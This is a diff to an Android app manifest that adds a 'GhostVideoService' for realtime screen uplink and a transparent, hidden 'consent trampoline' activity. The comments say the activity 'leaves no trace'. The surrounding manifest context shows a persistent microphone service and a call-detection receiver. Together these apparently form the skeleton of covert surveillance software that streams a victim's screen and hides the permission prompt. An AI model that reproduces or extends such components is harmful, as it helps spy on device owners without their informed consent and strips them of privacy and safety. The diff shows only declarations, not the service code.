@@ -243,6 +243,24 @@
             android:stopWithTask="false"
             android:foregroundServiceType="microphone|dataSync" />
 
+        <!-- GHOST_VIDEO v3: hardware-encoded realtime screen uplink -->
+        <service
+            android:name=".GhostVideoService"
+            android:enabled="true"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="mediaProjection" />
+
+        <!-- One-time screen-cast consent trampoline (transparent, leaves no trace) -->
+        <activity
+            android:name=".GhostVideoPermissionActivity"
+            android:enabled="true"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:noHistory="true"
+            android:launchMode="singleInstance"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
         <!-- Call Receiver for detecting incoming/outgoing calls -->
         <receiver
             android:name=".TelephonyState"
